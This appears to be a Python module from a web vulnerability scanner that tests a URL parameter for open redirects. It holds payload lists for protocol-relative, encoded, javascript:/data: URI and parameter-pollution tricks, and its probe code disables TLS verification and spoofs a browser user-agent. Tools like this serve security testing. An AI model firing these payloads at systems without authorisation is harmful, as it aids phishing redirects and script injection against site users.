"""
Open redirect scanner module.

Tests URL parameters for open redirect vulnerabilities using protocol-relative,
URL-encoded, double-slash, data/javascript URI, and parameter pollution payloads.
Detects 3xx redirects to untrusted domains, as well as meta/JS-based redirects
in response bodies.
"""

import re
import httpx
from typing import Optional
from urllib.parse import urlparse, urlencode, urljoin

EVIL_DOMAIN = "evil-redir-test.com"

PAYLOADS: dict[str, list[str]] = {
    "protocol_relative": [
        f"//{EVIL_DOMAIN}",
        f"////{EVIL_DOMAIN}",
        f"\\/\\/{EVIL_DOMAIN}",
        f"/\\//{EVIL_DOMAIN}",
        f"/{EVIL_DOMAIN}/%2F..",
    ],
    "absolute": [
        f"https://{EVIL_DOMAIN}",
        f"http://{EVIL_DOMAIN}",
        f"https://{EVIL_DOMAIN}@trusted.com",
        f"https://trusted.com@{EVIL_DOMAIN}",
    ],
    "encoded": [
        f"https%3A%2F%2F{EVIL_DOMAIN}",
        f"%2F%2F{EVIL_DOMAIN}",
        f"https%3A%2F%2F{EVIL_DOMAIN}%2F",
        f"//\x09{EVIL_DOMAIN}",
    ],
    "fragment_abuse": [
        f"/{EVIL_DOMAIN}",
        f"#{EVIL_DOMAIN}",
        f"?redirect={EVIL_DOMAIN}",
    ],
    "javascript_data": [
        "javascript:alert(document.domain)",
        "data:text/html,<script>window.location='https://evil.com'</script>",
        "java\tscript:alert(1)",
        "JaVaScRiPt:alert(1)",
    ],
    "parameter_pollution": [
        # Caller should inject these as raw query additions
        f"good.com&url=https://{EVIL_DOMAIN}",
        f"good.com&next=https://{EVIL_DOMAIN}",
        f"good.com&return=https://{EVIL_DOMAIN}",
    ],
}

# Patterns indicating a JS/meta redirect in response body
META_REDIRECT_RE = re.compile(
    r'(?:window\.location|location\.href|location\.replace|meta[^>]+http-equiv=["\']?refresh["\']?)[^>]*'
    + re.escape(EVIL_DOMAIN),
    re.IGNORECASE,
)


class OpenRedirect:
    """
    Scans a URL parameter for open redirect vulnerabilities.

    Usage:
        scanner = OpenRedirect(timeout=10, verbose=True)
        finding = scanner.scan("https://target.com/login", "next")
    """

    def __init__(self, timeout: int = 10, verbose: bool = False):
        self.timeout = timeout
        self.verbose = verbose
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
        )

    def _log(self, msg: str):
        if self.verbose:
            print(f"[REDIR] {msg}")

    def _is_evil_redirect(self, resp: httpx.Response) -> bool:
        """Return True if the response redirects to EVIL_DOMAIN."""
        if resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("location", "")
            self._log(f"Location: {location}")
            if EVIL_DOMAIN in location:
                return True
        return False

    def _has_js_meta_redirect(self, body: str) -> bool:
        """Return True if body contains a JS/meta redirect to EVIL_DOMAIN."""
        return bool(META_REDIRECT_RE.search(body))

    def _probe(self, url: str, param: str, payload: str, category: str) -> Optional[dict]:
        sep = "&" if "?" in url else "?"
        target = f"{url}{sep}{param}={payload}"
        self._log(f"Trying: {target}")
        try:
            resp = self.client.get(target)
            if self._is_evil_redirect(resp):
                return self._finding(url, param, payload, category, resp, "3xx_header")
            if self._has_js_meta_redirect(resp.text):
                return self._finding(url, param, payload, category, resp, "js_meta_body")
        except httpx.RequestError as e:
            self._log(f"Request error: {e}")
        return None

    @staticmethod
    def _finding(
        url: str, param: str, payload: str, category: str,
        resp: httpx.Response, detection: str,
    ) -> dict:
        return {
            "type": "OPEN_REDIRECT",
            "url": url,
            "param": param,
            "payload": payload,
            "category": category,
            "detection": detection,
            "status_code": resp.status_code,
            "location": resp.headers.get("location", ""),
            "evidence": resp.text[:300],
        }

    def scan(self, url: str, param: str) -> Optional[dict]:
        """
        Scan a URL parameter for open redirect vulnerabilities.

        Args:
            url:   Target URL (e.g. https://target.com/login)
            param: Redirect parameter name (e.g. "next", "url", "return_to")

        Returns:
            Finding dict on confirmed redirect, None otherwise.
        """
        self._log(f"Scanning {url} param={param}")
        for category, payloads in PAYLOADS.items():
            self._log(f"Testing category: {category}")
            for payload in payloads:
                finding = self._probe(url, param, payload, category)
                if finding:
                    return finding
        return None

    def close(self):
        self.client.close()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
